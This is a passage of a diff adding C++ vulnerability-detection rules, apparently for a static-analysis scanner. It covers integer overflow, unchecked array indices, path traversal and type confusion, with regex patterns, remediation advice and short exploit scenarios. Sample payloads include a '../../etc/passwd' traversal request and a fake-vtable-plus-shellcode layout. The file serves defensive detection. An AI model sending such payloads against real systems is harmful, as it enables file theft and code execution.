+    - numeric_limits
+    - SIZE_MAX
+    - UINT_MAX
+    - if.*overflow
+  severity_scoring:
+    severity_weight: 9
+    risk_score_formula_hint: severity_weight * confidence * (1 + user_controlled_size_factor + adjacent_object_sensitivity_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'An image parser reads width and height from a BMP file header as 32-bit unsigned integers. It computes
+      buffer_size = width * height * 4 (bytes per pixel). An attacker crafts a BMP with width=65536 and height=65537, causing
+      the multiplication to overflow to a small value on 32-bit builds. The parser allocates a tiny buffer but writes width*height*4
+      bytes of pixel data, overflowing the heap and overwriting adjacent allocations. The attacker grooms the heap to place
+      a C++ object with a virtual method table next to the image buffer, hijacking the vtable pointer to gain code execution.
+
+      '
+    example_payload: 'BMP header: width=0x10000, height=0x10001, bpp=32 -> size overflows to 0x40000 on 32-bit'
+    attacker_objective: Cause an undersized heap allocation via integer overflow in size computation, then exploit the resulting
+      heap buffer overflow for arbitrary code execution or information disclosure.
+  confidence_factors:
+    pattern_strength: medium
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - CPP-INJ-003
+    - CPP-INJ-004
+    - CPP-INJ-006
+- rule_id: CPP-INJ-006
+  title: Unvalidated Array Index
+  description: 'Detects array or buffer access using user-controlled indices without proper bounds validation. When an attacker
+    controls the index used to read from or write to an array, they can achieve out-of-bounds read (information disclosure,
+    ASLR bypass) or out-of-bounds write (arbitrary memory corruption, code execution). This is a prevalent vulnerability class
+    in C/C++ due to the absence of automatic bounds checking on raw arrays and pointer arithmetic.
+
+    '
+  language: cpp
+  category: injection
+  severity: High
+  confidence: 0.88
+  cwe: CWE-129
+  owasp: A03:2021-Injection
+  tags:
+  - array-index
+  - out-of-bounds
+  - bounds-check
+  - memory-read
+  - memory-write
+  - information-disclosure
+  - arbitrary-write
+  detection_layer: 2
+  attack_surface_type: array-boundary
+  patterns:
+  - type: regex
+    description: Array indexed by user-controlled variable without bounds check
+    pattern: \b\w+\s*\[\s*(?:argv|user_input|input|param|index|idx|offset|pos|i)\s*\]
+  - type: regex
+    description: Pointer arithmetic with user-controlled offset for array access
+    pattern: \*\s*\(\s*\w+\s*\+\s*(?:argv|user_input|input|param|index|idx|offset)\s*\)
+  - type: regex
+    description: Write to array element using user-controlled index
+    pattern: \b\w+\s*\[\s*(?:argv|user_input|input|index|idx|offset)\s*\]\s*=
+  - type: regex
+    description: atoi/strtol result used directly as array index
+    pattern: \b(?:atoi|atol|strtol|strtoul|strtoimax)\s*\([^)]+\)[^;]*\w+\s*\[
+  - type: regex
+    description: Network-received integer used as array index without validation
+    pattern: \b(?:ntohl|ntohs|recv|read)\s*\([^)]*\)[^;]*\w+\s*\[
+  - type: regex
+    description: Vector or array accessed with unchecked index from external source
+    pattern: \b\w+\s*\.\s*(?:at|operator\[\])\s*\(\s*(?:argv|user_input|input|param|index|idx)\s*\)
+  - type: regex
+    description: Computed index from parsed data used in buffer access
+    pattern: \b(?:sscanf|fscanf|scanf)\s*\([^)]*(?:&\s*(?:index|idx|offset|pos))\s*\)[^}]*\w+\s*\[\s*(?:index|idx|offset|pos)\s*\]
+  - type: regex
+    description: Negative index possible with signed integer type
+    pattern: \bint\s+(?:index|idx|offset|pos)\s*=[^;]*;[^}]*\w+\s*\[\s*(?:index|idx|offset|pos)\s*\]
+  anti_patterns:
+  - if.*index.*<.*size
+  - if.*idx.*<.*length
+  - if.*<.*capacity
+  - assert(
+  - bounds_check
+  - .at(
+  - std::clamp
+  - gsl::at
+  - if.*>= 0 &&
+  - if.*index.*>=.*0
+  - std::span
+  - gsl::span
+  bypass_variants:
+  - description: Signed integer index allowing negative values to bypass upper-bound-only check
+    pattern: \bif\s*\(\s*\w+\s*<\s*\w+\s*\)[^}]*\w+\s*\[\s*\w+\s*\]
+  - description: Index validated in one code path but not in another (conditional bypass)
+    pattern: \bif\s*\([^)]*\)\s*\{[^}]*\}\s*else\s*\{[^}]*\w+\s*\[\s*(?:index|idx|offset)\s*\]
+  - description: 'TOCTOU: index validated then modified before use'
+    pattern: \bif\s*\(\s*(\w+)\s*<[^}]*\1\s*(?:\+\+|\+=|--)[\s;][^}]*\w+\s*\[\s*\1\s*\]
+  evasion_indicators:
+  - Index computed through multiple intermediate arithmetic operations
+  - Bounds check on a different variable than the one actually used as index
+  - Signed/unsigned conversion allowing negative index bypass
+  - Index modified by callback or concurrent thread between validation and use
+  encoding_variants:
+  - type: indirect_index
+    pattern: \b\w+\s*\[\s*\w+\s*\[\s*(?:argv|user_input|input|param)\s*\]\s*\]
+  - type: computed_offset
+    pattern: \b\w+\s*\[\s*(?:argv|user_input|input|param)\s*\*\s*\d+\s*\+\s*\d+\s*\]
+  - type: function_return_index
+    pattern: \b\w+\s*\[\s*(?:get_index|parse_offset|compute_idx)\s*\([^)]*\)\s*\]
+  multi_function_chain_patterns:
+  - read_integer_from_network -> use_as_array_index -> out_of_bounds_access
+  - parse_user_field(offset) -> table[offset] -> return sensitive data (OOB read)
+  - atoi(argv[1]) -> buffer[index] = value -> arbitrary write primitive
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Out-of-bounds write via controlled index enables overwriting function pointers, vtable entries, or
+      return addresses in adjacent memory for privilege escalation.
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: User-supplied integer from command-line argument, form field, network packet, or file
+    sink: Array subscript operator [] or pointer arithmetic dereference
+    through: Parsed integer value used directly as index without bounds validation against array size
+  - source: Deserialized index field from binary protocol or file format
+    sink: Lookup table or configuration array access
+    through: Index passed through conversion functions (atoi, ntohl) to array access without range check
+  impact: "Unvalidated array indices enable two critical attack classes:\n  - Out-of-bounds read: leaking sensitive data from\
+    \ adjacent memory,\n    including cryptographic keys, session tokens, ASLR base addresses,\n    and stack canary values.\
+    \ This can be chained with other exploits.\n  - Out-of-bounds write: corrupting adjacent heap/stack objects including\n\
+    \    function pointers, vtable pointers, return addresses, and security-\n    critical flags. This directly enables arbitrary\
+    \ code execution.\nThe Heartbleed vulnerability (CVE-2014-0160) is a canonical example of\nOOB read via missing bounds\
+    \ check. Array index bugs in kernel drivers\nfrequently lead to local privilege escalation.\n"
+  remediation: "Framework-specific fixes:\n  - Modern C++: use std::vector::at() or std::array::at() for bounds-checked access\n\
+    \  - C++ GSL: use gsl::at() for bounds-checked array/span access\n  - C: always validate index >= 0 && index < array_size\
+    \ before access\n  - Qt: use QVector::value() with default return for safe out-of-range access\nSecure libraries:\n  -\
+    \ C++ Standard Library containers with .at() method (throws std::out_of_range)\n  - gsl::span and gsl::at from Guideline\
+    \ Support Library\n  - Boost.MultiArray with bounds-checked access modes\n  - SafeInt for safe index arithmetic\nPrevention\
+    \ strategies:\n  - Always validate both lower bound (>= 0) and upper bound (< size) for indices\n  - Use unsigned types\
+    \ (size_t) for indices and sizes to eliminate negative index attacks\n  - Prefer range-based for loops over manual indexing\n\
+    \  - Use std::span (C++20) to carry size information with pointers\n  - Enable UBSan (-fsanitize=undefined) for runtime\
+    \ out-of-bounds detection\n  - Use ASan (-fsanitize=address) for heap/stack buffer overflow detection\n  - Apply compiler\
+    \ hardening: -fbounds-checking (GCC), -fsanitize=bounds (Clang)\n  - Use static analysis (Coverity, PVS-Studio, Polyspace)\
+    \ to detect missing bounds checks\n  - Fuzz array access paths with AFL/libFuzzer to discover edge cases\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/129.html
+  - https://wiki.sei.cmu.edu/confluence/display/c/ARR30-C.+Do+not+form+or+use+out-of-bounds+pointers+or+array+subscripts
+  - https://cwe.mitre.org/data/definitions/787.html
+  context_awareness:
+    surrounding_context_patterns:
+    - '#include <stdlib.h>'
+    - '#include <cstdlib>'
+    - '#include <vector>'
+    - '#include <array>'
+    - '#include <cstring>'
+    - int main(
+    - char.*\[.*\]
+    - int.*\[.*\]
+    taint_source_indicators:
+    - argv[
+    - std::cin
+    - scanf(
+    - fgets(
+    - recv(
+    - read(
+    - fread(
+    - atoi(
+    - atol(
+    - strtol(
+    - strtoul(
+    - sscanf(
+    - ntohl(
+    - ntohs(
+    taint_sink_indicators:
+    - array[
+    - buffer[
+    - table[
+    - data[
+    - ptr[
+    - '*(ptr +'
+    - '*(base +'
+    - .operator[](
+    - vector[
+    sanitization_patterns:
+    - if.*< size
+    - if.*< length
+    - if.*< capacity
+    - if.*>= 0
+    - assert(
+    - .at(
+    - gsl::at
+    - std::clamp
+    - bounds_check
+  severity_scoring:
+    severity_weight: 9
+    risk_score_formula_hint: severity_weight * confidence * (1 + write_vs_read_factor + adjacent_object_criticality)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A network protocol parser reads a message type field as a uint8_t from the wire, then uses it to index
+      into a function pointer dispatch table: handler_table[msg_type](payload). The table has 16 entries but msg_type can
+      be 0-255. An attacker sends msg_type=200, causing an out-of-bounds read of the handler_table. If the memory at that
+      offset happens to contain an attacker-influenced value (via heap spraying or adjacent data control), the indirect call
+      jumps to attacker-controlled code. Even without write access, the OOB read leaks function pointers that defeat ASLR.
+
+      '
+    example_payload: msg_type=0xFF to read function pointer 240 entries past the table boundary
+    attacker_objective: Use an out-of-bounds array index to read sensitive memory (ASLR bypass, credential theft) or write
+      to arbitrary memory locations (function pointer hijacking, privilege escalation).
+  confidence_factors:
+    pattern_strength: medium
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - CPP-INJ-003
+    - CPP-INJ-005
+    - CPP-INJ-004
+- rule_id: CPP-INJ-007
+  title: Path Traversal via File Operations
+  description: 'Detects path traversal vulnerabilities in C++ file operations where user-controlled input is passed to fopen,
+    ifstream, ofstream, or other file I/O functions without proper path validation. Attackers can use directory traversal
+    sequences (../ or ..\) to escape intended directories, reading sensitive files such as /etc/passwd, /etc/shadow, configuration
+    files, private keys, or writing to arbitrary filesystem locations to overwrite executables, cron jobs, or configuration
+    files.
+
+    '
+  language: cpp
+  category: injection
+  severity: High
+  confidence: 0.9
+  cwe: CWE-22
+  owasp: A01:2021-Broken Access Control
+  tags:
+  - path-traversal
+  - directory-traversal
+  - file-access
+  - lfi
+  - arbitrary-read
+  - arbitrary-write
+  - fopen
+  - ifstream
+  detection_layer: 2
+  attack_surface_type: filesystem-boundary
+  patterns:
+  - type: regex
+    description: fopen with user-controlled filename parameter
+    pattern: \bfopen\s*\(\s*(?:argv|user_input|input|param|filename|filepath|path|name|url|request)\b
+  - type: regex
+    description: C++ ifstream/ofstream constructed with user-controlled path
+    pattern: \b(?:std::)?(?:ifstream|ofstream|fstream)\s+\w+\s*\(\s*(?:argv|user_input|input|param|filename|filepath|path|name)\b
+  - type: regex
+    description: ifstream/ofstream open() with user-controlled path
+    pattern: \b\w+\s*\.\s*open\s*\(\s*(?:argv|user_input|input|param|filename|filepath|path|name)\b
+  - type: regex
+    description: String concatenation building file path from user input
+    pattern: \b(?:fopen|ifstream|ofstream|fstream)\s*[\(\s]\s*\(\s*(?:std::)?string\s*\([^)]*\)\s*\+\s*(?:argv|user_input|input|param|filename|path)\b
+  - type: regex
+    description: C-style file operations with user-controlled path (stat, access, unlink)
+    pattern: \b(?:stat|lstat|access|unlink|remove|rename|chmod|chown|mkdir|rmdir)\s*\(\s*(?:argv|user_input|input|param|filename|filepath|path)\b
+  - type: regex
+    description: Path built via sprintf/snprintf with user-controlled component
+    pattern: \b(?:sprintf|snprintf)\s*\(\s*\w+\s*,\s*[^,]*,\s*"[^"]*%s[^"]*"\s*,\s*(?:argv|user_input|input|param|filename|path)\b
+  - type: regex
+    description: Windows-specific file operations with user input
+    pattern: \b(?:CreateFile[AW]?|_wfopen|_tfopen|DeleteFile[AW]?|CopyFile[AW]?|MoveFile[AW]?)\s*\(\s*(?:argv|user_input|input|param|filename|filepath|path)\b
+  - type: regex
+    description: Boost filesystem operations with user-controlled path
+    pattern: \b(?:boost::filesystem|std::filesystem)\s*::\s*(?:path|exists|remove|copy|rename|create_directory)\s*\(\s*(?:argv|user_input|input|param|filename|filepath|path)\b
+  anti_patterns:
+  - realpath(
+  - canonical(
+  - std::filesystem::canonical
+  - boost::filesystem::canonical
+  - std::filesystem::weakly_canonical
+  - basename(
+  - if.*\.\.
+  - if.*find.*".."
+  - sanitize_path
+  - chroot(
+  - jail
+  - allowlist
+  bypass_variants:
+  - description: URL-encoded traversal sequences (%2e%2e%2f) decoded before file access
+    pattern: \b(?:url_decode|urldecode|percent_decode)\s*\([^)]*\)[^;]*\b(?:fopen|ifstream|open)\b
+  - description: Double-encoding or null byte injection to bypass path filters
+    pattern: \b(?:fopen|ifstream)\s*[\(\s].*(?:\\x00|\\0|%00)
+  - description: Symlink-based traversal bypassing path prefix validation
+    pattern: \b(?:symlink|link)\s*\([^)]*\)[^}]*\b(?:fopen|open|ifstream)\s*\(
+  evasion_indicators:
+  - Path validation on one variable but file opened with a different variable
+  - Path check for '..' but not for absolute paths starting with /
+  - Null byte injection truncating validated suffix
+  - Symlink race condition (TOCTOU) between path check and file open
+  - Windows alternate data streams (filename:stream) bypassing extension checks
+  encoding_variants:
+  - type: url_encoded_traversal
+    pattern: (?:%2e%2e%2f|%2e%2e/|\.\.%2f|%2e%2e%5c)
+  - type: unicode_normalization
+    pattern: (?:\\u002e\\u002e\\u002f|\\xc0\\xae\\xc0\\xae)
+  - type: windows_alt_separator
+    pattern: (?:\\\\\\.\\.\\\\|/\\.\\./)
+  multi_function_chain_patterns:
+  - recv(user_path) -> string_concat(base_dir + user_path) -> fopen(result) -> fread -> send_to_client
+  - getline(cin, filename) -> ifstream(directory + filename) -> read_contents -> display
+  - parse_http_request(url_path) -> serve_static_file(docroot + url_path) -> send_response
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Reading sensitive configuration files (/etc/shadow, private keys) or overwriting executables and cron
+      jobs enables privilege escalation from web service user to root.
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: HTTP request path, query parameter, filename field, or uploaded file name
+    sink: fopen(), ifstream constructor, ofstream constructor, or filesystem API
+    through: String concatenation of base directory with user-controlled path component without canonicalization or traversal
+      filtering
+  - source: Command-line argument or configuration file entry specifying file path
+    sink: stat(), open(), unlink(), or other filesystem syscall wrappers
+    through: Path parameter passed through without realpath() canonicalization or chroot confinement
+  impact: "Path traversal in C++ applications enables:\n  - Arbitrary file read: accessing /etc/passwd, /etc/shadow, SSH private\
+    \ keys,\n    application source code, database credentials, and API secrets\n  - Arbitrary file write: overwriting application\
+    \ binaries, cron jobs,\n    authorized_keys files, web shells, or configuration files\n  - Information disclosure: leaking\
+    \ source code, build artifacts, and internal\n    data structures that aid further exploitation\n  - Denial of service:\
+    \ deleting or corrupting critical system or application files\nC++ applications frequently run as system services with\
+    \ elevated filesystem\npermissions, making path traversal especially impactful. Combined with\nfile write capabilities,\
+    \ this can achieve remote code execution.\n"
+  remediation: "Framework-specific fixes:\n  - POSIX: use realpath() to canonicalize paths and verify they start with the\
+    \ allowed base directory\n  - C++17: use std::filesystem::canonical() or weakly_canonical() for path normalization\n \
+    \ - Boost: use boost::filesystem::canonical() for path resolution\n  - Windows: use GetFullPathNameW() and verify the\
+    \ canonical path is within the allowed directory\n  - chroot jails: confine the process filesystem view to the intended\
+    \ directory tree\nSecure libraries:\n  - std::filesystem (C++17) for path manipulation with canonical()\n  - boost::filesystem\
+    \ for cross-platform path canonicalization\n  - libseccomp for restricting filesystem syscalls via seccomp-bpf\n  - AppArmor/SELinux\
+    \ profiles for mandatory access control on file paths\nPrevention strategies:\n  - Canonicalize all user-provided paths\
+    \ with realpath()/std::filesystem::canonical()\n  - Verify canonical path starts with the intended base directory prefix\n\
+    \  - Reject paths containing \"..\" components, absolute path prefixes, or null bytes\n  - Use an allowlist of permitted\
+    \ filenames or path patterns\n  - Strip or reject non-ASCII characters and control characters in filenames\n  - Use chroot,\
+    \ containers, or namespace isolation to limit filesystem access\n  - Apply principle of least privilege: run file-serving\
+    \ processes as unprivileged users\n  - Use O_NOFOLLOW and O_NOTRAVERSE flags to prevent symlink-based traversal\n  - Log\
+    \ and monitor file access patterns for anomalous traversal attempts\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/22.html
+  - https://owasp.org/www-community/attacks/Path_Traversal
+  - https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html
+  context_awareness:
+    surrounding_context_patterns:
+    - '#include <stdio.h>'
+    - '#include <cstdio>'
+    - '#include <fstream>'
+    - '#include <iostream>'
+    - '#include <filesystem>'
+    - '#include <sys/stat.h>'
+    - '#include <fcntl.h>'
+    - '#include <unistd.h>'
+    - '#include <windows.h>'
+    taint_source_indicators:
+    - argv[
+    - std::cin
+    - getline(
+    - scanf(
+    - fgets(
+    - recv(
+    - read(
+    - getenv(
+    - fread(
+    - get_query_param(
+    - request.path
+    - request.url
+    - http_request
+    taint_sink_indicators:
+    - fopen(
+    - open(
+    - ifstream(
+    - ofstream(
+    - fstream(
+    - .open(
+    - stat(
+    - access(
+    - unlink(
+    - remove(
+    - rename(
+    - CreateFile(
+    - DeleteFile(
+    sanitization_patterns:
+    - realpath(
+    - canonical(
+    - std::filesystem::canonical
+    - boost::filesystem::canonical
+    - starts_with(base_dir)
+    - find("..")
+    - basename(
+    - sanitize_path
+    - chroot(
+  severity_scoring:
+    severity_weight: 9
+    risk_score_formula_hint: severity_weight * confidence * (1 + write_access_factor + privilege_level_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A C++ web server serves static files by concatenating a document root with the request URI: fopen((docroot
+      + request_path).c_str(), "r"). An attacker sends GET /../../../../etc/shadow HTTP/1.1 to traverse out of the document
+      root and read the system password shadow file. If the server also supports PUT requests for file upload, the attacker
+      can write a cron job or SSH authorized_keys entry to gain persistent shell access.
+
+      '
+    example_payload: GET /static/../../../../../../../etc/passwd HTTP/1.1
+    attacker_objective: Escape the intended file serving directory to read sensitive system files (credential theft, source
+      code access) or write arbitrary files (web shell upload, cron job injection, SSH key injection).
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - CPP-INJ-001
+    - CPP-INJ-003
+    - CPP-INJ-006
+- rule_id: CPP-INJ-008
+  title: Unsafe Deserialization and Type Confusion
+  description: 'Detects type confusion and unsafe deserialization vulnerabilities in C++ where untrusted data is used to determine
+    object types, drive unsafe casts, or reconstruct objects without proper type validation. Attackers can craft serialized
+    input to instantiate unexpected types, corrupt vtable pointers via reinterpret_cast or C-style casts on untrusted data,
+    or inject objects whose destructors or virtual methods execute attacker-controlled code. Type confusion is a critical
+    vulnerability class in polymorphic C++ codebases, browser engines, and any application deserializing complex object graphs
+    from untrusted sources.
+
+    '
+  language: cpp
+  category: injection
+  severity: High
+  confidence: 0.87
+  cwe: CWE-843
+  owasp: A08:2021-Software and Data Integrity Failures
+  tags:
+  - type-confusion
+  - deserialization
+  - unsafe-cast
+  - vtable-corruption
+  - reinterpret_cast
+  - object-injection
+  - polymorphism-abuse
+  detection_layer: 4
+  attack_surface_type: type-system-boundary
+  patterns:
+  - type: regex
+    description: reinterpret_cast from buffer or untrusted data pointer
+    pattern: \breinterpret_cast\s*<[^>]+>\s*\(\s*(?:buf|buffer|data|input|payload|packet|recv_buf|raw|bytes)\b
+  - type: regex
+    description: C-style cast from void pointer or raw buffer to complex type
+    pattern: \(\s*(?:struct\s+)?\w+\s*\*\s*\)\s*(?:buf|buffer|data|input|payload|packet|recv_buf|raw|bytes)\b
+  - type: regex
+    description: static_cast from base to derived using untrusted type discriminator
+    pattern: \bstatic_cast\s*<\s*\w+\s*\*\s*>\s*\(\s*\w+\s*\)[^;]*(?:type_id|type_code|msg_type|kind|tag|discriminator)\b
+  - type: regex
+    description: Object constructed by placement new on untrusted data buffer
+    pattern: \bnew\s*\(\s*(?:buf|buffer|data|input|payload|raw|bytes)\s*\)\s*\w+
+  - type: regex
+    description: memcpy into object or struct from network/file data
+    pattern: \bmemcpy\s*\(\s*(?:&\s*)?\w+\s*,\s*(?:buf|buffer|data|input|payload|packet|recv_buf)\s*,\s*sizeof\s*\(
+  - type: regex
+    description: Union-based type punning with untrusted selector
+    pattern: \bunion\s+\w*\s*\{[^}]*\}\s*\w+\s*;[^}]*(?:type|kind|tag|selector)\b
+  - type: regex
+    description: Variant or any type accessed with unchecked type assumption
+    pattern: \b(?:std::get|std::any_cast|boost::any_cast|boost::get)\s*<[^>]+>\s*\(\s*(?:input|data|payload|param|received|parsed)\b
+  - type: regex
+    description: Dynamic dispatch on type field from deserialized data to instantiate objects
+    pattern: \bswitch\s*\(\s*(?:type_id|type_code|msg_type|object_type|class_id)\s*\)\s*\{[^}]*\bnew\s+\w+
+  anti_patterns:
+  - dynamic_cast
+  - typeid(
+  - std::holds_alternative
+  - std::get_if
+  - std::any::type()
+  - boost::any::type()
+  - protobuf
+  - flatbuffers
+  - capnproto
+  - 'cereal::'
+  - boost::serialization
+  - nlohmann::json
+  bypass_variants:
+  - description: Type discriminator forged in serialized data to trigger wrong static_cast branch
+    pattern: \breadline\s*\([^)]*\)[^}]*switch\s*\(\s*(?:type|kind)\s*\)[^}]*static_cast
+  - description: Polymorphic downcast without dynamic_cast based on untrusted runtime type information
+    pattern: \bstatic_cast\s*<\s*\w+Derived\s*\*\s*>\s*\(\s*base_ptr\s*\)
+  - description: Void pointer from deserialized data cast to function pointer and invoked
+    pattern: \(\s*(?:void\s*\(\s*\*\s*\)\s*\([^)]*\)|func_ptr_t)\s*\)\s*(?:buf|data|input|payload)\b
+  evasion_indicators:
+  - Type discriminator in data controls which cast branch is taken
+  - Custom serialization format without schema validation
+  - reinterpret_cast or C-style cast applied to data from recv/fread
+  - Object reconstruction from raw bytes without constructor invocation
+  - Virtual method called on object reconstructed from untrusted buffer
+  encoding_variants:
+  - type: serialized_type_tag
+    pattern: \b(?:read|recv|fread)\s*\([^)]*\)[^}]*(?:type_id|class_id|object_type)\s*=\s*(?:\*|static_cast)
+  - type: binary_protocol_cast
+    pattern: \breinterpret_cast\s*<\s*(?:struct\s+)?\w+Header\s*\*\s*>\s*\(\s*(?:packet|frame|message)_(?:buf|data)\b
+  - type: custom_vtable_injection
+    pattern: \bmemcpy\s*\(\s*(?:&\s*)?\w+\s*,\s*(?:data|input|buf)\s*,[^)]*\)[^}]*\w+\s*->\s*\w+\s*\(
+  multi_function_chain_patterns:
+  - recv(data) -> read_type_field(data) -> reinterpret_cast<DerivedType*>(data) -> call_virtual_method()
+  - deserialize(stream) -> create_object_by_type_id(id) -> static_cast<Derived*>(base) -> invoke()
+  - fread(buffer) -> memcpy(&object, buffer, sizeof) -> object.virtual_method() (vtable from untrusted data)
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Type confusion allows attacker to treat one object type as another, accessing fields at wrong offsets.
+      When the confused type has a vtable, attacker-controlled data at the vtable pointer offset enables arbitrary code execution.
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: Serialized object data from network socket, file, IPC, or shared memory
+    sink: reinterpret_cast, static_cast, C-style cast, or placement new on the received buffer
+    through: Raw byte buffer received and cast to a typed pointer without schema validation or dynamic_cast type checking
+  - source: Type discriminator field in untrusted protocol message or file format
+    sink: Switch/dispatch table selecting which derived class to static_cast to
+    through: Forged type ID causes incorrect downcast, accessing derived class fields/vtable from a different base object
+      layout
+  impact: "Type confusion and unsafe deserialization in C++ enables:\n  - Vtable hijacking: attacker-controlled data at the\
+    \ vtable pointer offset\n    causes virtual method calls to jump to arbitrary addresses\n  - Arbitrary read/write: accessing\
+    \ fields at wrong offsets reads or writes\n    unintended memory locations\n  - Remote code execution: the most common\
+    \ exploitation outcome, particularly\n    in browser engines, media parsers, and network protocol handlers\n  - Object\
+    \ injection: instantiating attacker-chosen types whose constructors\n    or destructors have dangerous side effects\n\
+    \  - Information disclosure: reading fields at wrong offsets leaks pointers,\n    keys, and other sensitive data from\
+    \ adjacent object fields\nType confusion bugs have been central to numerous high-profile exploits\nincluding browser JIT\
+    \ engine attacks, PDF parser exploits, and kernel\ndriver vulnerabilities. They frequently bypass CFI when the confused\
+    \ types\nshare compatible call signatures.\n"
+  remediation: "Framework-specific fixes:\n  - C++: use dynamic_cast<Derived*>(base) for safe runtime-checked downcasts (returns\
+    \ nullptr on failure)\n  - C++17: use std::variant with std::visit for type-safe discriminated unions\n  - C++17: use\
+    \ std::any with std::any_cast which throws std::bad_any_cast on type mismatch\n  - Protobuf/FlatBuffers/Cap'n Proto: use\
+    \ schema-validated deserialization instead of raw casts\nSecure libraries:\n  - Protocol Buffers (protobuf) for schema-validated\
+    \ serialization\n  - FlatBuffers for zero-copy schema-validated deserialization\n  - Cap'n Proto for capability-based\
+    \ serialization with type safety\n  - cereal library for type-safe C++ serialization with class registration\n  - Boost.Serialization\
+    \ with registered types and version control\n  - nlohmann::json for structured text-based serialization\nPrevention strategies:\n\
+    \  - Never use reinterpret_cast on untrusted data buffers\n  - Always use dynamic_cast for polymorphic downcasts and check\
+    \ for nullptr\n  - Validate type discriminators against an allowlist before casting\n  - Use std::variant instead of unions\
+    \ for type-safe tagged unions\n  - Implement schema validation before deserialization (validate before parse)\n  - Use\
+    \ RTTI (typeid) or custom type registries for runtime type verification\n  - Enable Clang CFI (-fsanitize=cfi) to detect\
+    \ type confusion at runtime\n  - Use -fsanitize=undefined with -fsanitize=vptr for virtual call validation\n  - Avoid\
+    \ placement new on untrusted buffers; copy data into constructed objects field by field\n  - Use fuzzing with structure-aware\
+    \ mutators (libprotobuf-mutator) to test deserialization\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/843.html
+  - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Incoming_Requests
+  - https://cwe.mitre.org/data/definitions/502.html
+  context_awareness:
+    surrounding_context_patterns:
+    - '#include <typeinfo>'
+    - '#include <any>'
+    - '#include <variant>'
+    - '#include <cstring>'
+    - class.*:.*public
+    - virtual
+    - dynamic_cast
+    - reinterpret_cast
+    - union
+    taint_source_indicators:
+    - recv(
+    - read(
+    - fread(
+    - recvfrom(
+    - std::cin
+    - getline(
+    - fgets(
+    - mmap(
+    - shared_memory
+    - pipe_read
+    - deserialize(
+    - parse(
+    taint_sink_indicators:
+    - reinterpret_cast<
+    - static_cast<
+    - '(struct '
+    - '(class '
+    - placement new
+    - memcpy(&obj
+    - ->virtual_method
+    - std::any_cast<
+    - boost::any_cast<
+    - std::get<
+    sanitization_patterns:
+    - dynamic_cast<
+    - typeid(
+    - std::holds_alternative
+    - std::get_if
+    - type().name()
+    - schema_validate
+    - protobuf::ParseFromArray
+    - flatbuffers::Verify
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 + vtable_presence_factor + polymorphism_depth_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A C++ game server receives player action messages over the network. Each message contains a type_id byte
+      followed by message data. The server uses static_cast<ActionMove*>(base_msg) when type_id == 1 and static_cast<ActionAttack*>(base_msg)
+      when type_id == 2. An attacker sends a message with type_id=1 but crafts the payload with the layout of ActionAttack,
+      which has a function pointer at a different offset. When the server calls base_msg->execute() after casting to ActionMove,
+      the vtable lookup dereferences attacker-controlled bytes as a function pointer, redirecting execution to shellcode embedded
+      in the message payload.
+
+      '
+    example_payload: type_id=0x01 + 48 bytes padding + 0xdeadbeef (fake vtable ptr) + shellcode
+    attacker_objective: Exploit type confusion to corrupt vtable pointers or access fields at wrong offsets, achieving arbitrary
+      code execution or sensitive data leakage through confused object interpretation.
+  confidence_factors:
+    pattern_strength: medium
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - CPP-INJ-003
+    - CPP-INJ-004
+    - CPP-INJ-006
